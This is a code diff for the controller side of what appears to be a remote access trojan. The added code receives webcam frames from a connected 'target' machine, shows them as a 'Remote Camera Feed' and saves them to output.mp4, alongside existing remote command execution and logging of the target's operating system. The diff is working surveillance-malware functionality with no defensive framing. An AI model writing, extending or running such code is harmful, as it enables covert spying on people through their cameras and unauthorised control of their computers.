@@ -11,13 +11,16 @@ SEPARATOR = "<sep>"  # Separator string for sending 2 messages at a time
 # Global variables
 s = None
 client_socket = None
+recording_thread = None
 streaming_thread = None
 cap = None
+out = None
 running = True  # Flag to control the loop
+recording = False  # Flag to control the recording loop
 streaming = False  # Flag to control the streaming loop
 
 def start_server(log_message):
-    global s, client_socket, client_address, cwd, targets_os, cap, streaming_thread, running
+    global s, client_socket, client_address, cwd, targets_os, cap, out, recording_thread, streaming_thread, running
     # Create the socket object.
     s = socket.socket()
     # Bind the socket to all IP addresses of this host.
@@ -38,6 +41,8 @@ def start_server(log_message):
     log_message("[+] Target's Operating system: " + targets_os)
     # Set up the video capture and writer.
     cap = None
+    out = None
+    recording_thread = None
     streaming_thread = None
 
     while running:
@@ -57,10 +62,40 @@ def start_server(log_message):
             results, cwd = output.split(SEPARATOR)
             log_message(results)
     # Close the connection to the client and server.
+    if recording_thread is not None:
+        recording_thread.join()
     if streaming_thread is not None:
         streaming_thread.join()
     client_socket.close()
     s.close()
+
+# Function to record and display the video.
+def record_video():
+    global out, recording
+    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
+    out = cv2.VideoWriter('output.mp4', fourcc, 30.0, (640, 480))
+    while recording:
+        # Receive the frame size.
+        frame_size = int.from_bytes(client_socket.recv(4), byteorder='little')
+        # Receive the frame data.
+        frame_data = b''
+        while len(frame_data) < frame_size:
+            packet = client_socket.recv(min(BUFFER_SIZE, frame_size - len(frame_data)))
+            if not packet:
+                break
+            frame_data += packet
+        if not frame_data:
+            break
+        # Decode the frame.
+        frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
+        # Write the frame to the video file.
+        out.write(frame)
+        # Display the frame.
+        cv2.imshow('Remote Camera Feed', frame)
+        if cv2.waitKey(1) & 0xFF == ord('q'):
+            break
+    out.release()
+    cv2.destroyAllWindows()
 
 # Function to stream live video.
 def stream_video():
@@ -92,6 +127,22 @@ def send_command(command, log_message, root):
         if command.lower() == "exit":
             log_message("Exiting...")
             root.quit()
+
+# Function to start recording
+def start_recording(log_message):
+    global recording, recording_thread
+    if client_socket is not None and not recording:
+        recording = True
+        recording_thread = threading.Thread(target=record_video)
+        recording_thread.start()
+        log_message("Video recording started.")
+
+# Function to stop recording
+def stop_recording(log_message):
+    global recording
+    if recording:
+        recording = False
+        log_message("Video recording stopped.")
 
 # Function to start streaming
 def start_streaming(log_message):
